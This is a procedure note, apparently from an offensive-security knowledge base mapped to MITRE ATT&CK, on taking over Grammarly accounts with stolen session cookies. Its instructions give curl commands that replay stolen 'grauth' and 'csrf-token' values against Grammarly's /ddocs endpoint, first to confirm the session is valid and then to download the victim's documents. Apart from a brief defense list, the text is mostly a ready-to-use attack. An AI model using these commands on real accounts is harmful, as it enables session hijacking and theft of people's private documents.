---
tags:
  - account-takeover
  - session-hijacking
  - curl-access
type: procedure
tools: []
tactics:
  - '[[Lateral Movement]]'
commands:
  - '[[commands/access-grammarly-document-with-stolen-cookies]]'
verified: false
platforms:
  - Web
submitted: true
techniques:
  - '[[Valid Accounts]]'
  - '[[Steal Web Session Cookie]]'
sub_techniques: []
id: 6a123795-c67a-4d16-8a22-22f25f62d63e
created_at: '2025-12-14T17:33:34.371Z'
updated_at: '2025-12-14T17:33:34.371Z'
validated: true
mitre_tactics:
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Steal Web Session Cookie]]'
---
# Use-Stolen-Cookies-for-Grammarly-Account-Takeover

## Summary

This procedure uses the exfiltrated session cookies (grauth and csrf-token) to authenticate requests to Grammarly's API endpoints, allowing access to the victim's documents and achieving full account takeover.

## Description

By setting the stolen cookies in HTTP requests, the attacker can impersonate the victim from any IP, retrieving sensitive data like documents via /ddocs endpoints without further authentication.

## Requirements

1. Stolen grauth and csrf-token values
2. curl or similar HTTP client
3. Known document ID (e.g., from recon or enumeration)

## Defense

Defensive measures and detection strategies:

- Bind sessions to IP or user-agent
- Implement short-lived tokens and rotation
- Log and alert on access from new IPs

## Objectives

1. Validate stolen credentials
2. Access victim resources
3. Demonstrate takeover impact

## Instructions

### Step 1: Prepare Cookies

**Context**: Replace placeholders with stolen values.

Use [[commands/access-grammarly-document-with-stolen-cookies]]:
```bash
curl https://app.grammarly.com/ddocs/417782102 --cookie "grauth=STOLEN_GRAUTH" --cookie "csrf-token=STOLEN_CSRF" -I
```

> Expected output: HTTP 200 OK headers if valid.

### Step 2: Access Data

**Context**: Fetch full content if headers succeed.

Remove -I for body:
```bash
curl https://app.grammarly.com/ddocs/417782102 --cookie "grauth=STOLEN_GRAUTH" --cookie "csrf-token=STOLEN_CSRF"
```

> Success: Document content returned; failure: 301 redirect to login.

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement]]

### Techniques

- [[Valid Accounts]]
- [[Steal Web Session Cookie]]

### Sub-Techniques


## Commands Used

- [[commands/access-grammarly-document-with-stolen-cookies]]

## Tools Used


## Tags

- [[account-takeover]]
- [[session-hijacking]]
